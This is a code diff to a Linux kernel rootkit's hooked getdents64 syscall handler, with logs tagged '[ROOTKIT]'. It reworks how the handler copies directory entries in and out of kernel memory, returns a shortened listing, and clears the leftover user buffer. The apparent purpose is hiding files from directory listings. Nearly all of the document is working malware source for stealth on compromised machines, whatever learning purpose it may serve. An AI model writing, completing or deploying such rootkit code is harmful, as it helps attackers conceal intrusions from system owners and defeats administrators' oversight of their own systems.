@@ -182,7 +182,8 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                       struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
 {
-    long l_ret               = 0; // Return value of the real syscall
+    long l_ret_orig          = 0; // Original return value of the real syscall
+    long l_ret               = 0; // Return value that will be returned to the caller
     long l_err               = 0; // Error code of the copy functions
     long l_move_len          = 0; // Length of the data to move
     unsigned short us_reclen = 0; // Length of the current directory entry
@@ -192,36 +193,40 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
-    l_ret = orig_getdents64(p_regs);
-    if (l_ret <= 0) {
+    l_ret_orig = orig_getdents64(p_regs);
+    if (l_ret_orig <= 0) {
         // No entries or error, return immediately
-        if (l_ret == 0) {
+        if (l_ret_orig == 0) {
             pr_info("[ROOTKIT] * No entries");
         } else {
-            pr_err("[ROOTKIT] * Error: %ld", l_ret);
+            pr_err("[ROOTKIT] * Error: %ld", l_ret_orig);
         }
-        return l_ret;
+        return l_ret_orig;
     }
 
-    p_dirent_k = (struct linux_dirent64 *)kzalloc(l_ret, GFP_KERNEL);
+    p_dirent_k = (struct linux_dirent64 *)kzalloc(l_ret_orig, GFP_KERNEL);
 
     if (p_dirent_k == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory");
-        return l_ret;
+        return l_ret_orig;
     }
 
+
     // Copy data from user to kernel
-    l_err = copy_from_user(p_dirent_k, p_dirent, l_ret);
+    l_err = copy_from_user(p_dirent_k, p_dirent, l_ret_orig);
 
     if (l_err != 0) {
         pr_err("[ROOTKIT] * Could not copy data from user");
         kfree(p_dirent_k);
-        return l_ret;
+        return l_ret_orig;
     }
+
 
     pr_info("[ROOTKIT] * Directory entries:");
 
     p_dirent_k_it = p_dirent_k;
+    l_ret         = l_ret_orig;
+
     while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret || p_dirent_k_it->d_reclen == 0) {
         pr_info("[ROOTKIT]   * %s", p_dirent_k_it->d_name);
         pr_info("[ROOTKIT]     * Iter: %p, l_ret: %ld", p_dirent_k_it, l_ret);
@@ -256,7 +261,14 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     // Copy data back to user
     l_err = copy_to_user(p_dirent, p_dirent_k, l_ret);
 
-    if (l_err != 0) {
+
+    if (l_err == 0) {
+        // Erase the rest of the user buffer to avoid leaking data
+        l_err = clear_user((char *)p_dirent + l_ret, l_ret_orig - l_ret);
+        if (l_err != 0) {
+            pr_err("[ROOTKIT] * Could not clear user buffer");
+        }
+    } else {
         pr_err("[ROOTKIT] * Could not copy data back to user");
     }
 
